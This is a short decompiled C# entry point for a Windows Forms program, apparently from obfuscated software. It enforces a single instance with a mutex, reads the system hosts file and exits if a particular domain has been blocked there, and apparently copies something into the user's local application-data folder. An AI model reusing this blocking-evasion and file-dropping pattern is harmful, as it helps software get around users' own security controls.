using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace ns1;

internal static class Class2
{
	public static Mutex mutex_0 = new Mutex(initiallyOwned: true, "{3H5S4GD4-8NB1-12lc-A8CF-72F04X6ALCKL}");

	[STAThread]
	private static void Main()
	{
		if (mutex_0.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			smethod_0();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Class0.string_2;
			Class0.smethod_3();
			Class0.smethod_2(Class0.string_1, path);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			mutex_0.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public static void smethod_0()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}
}
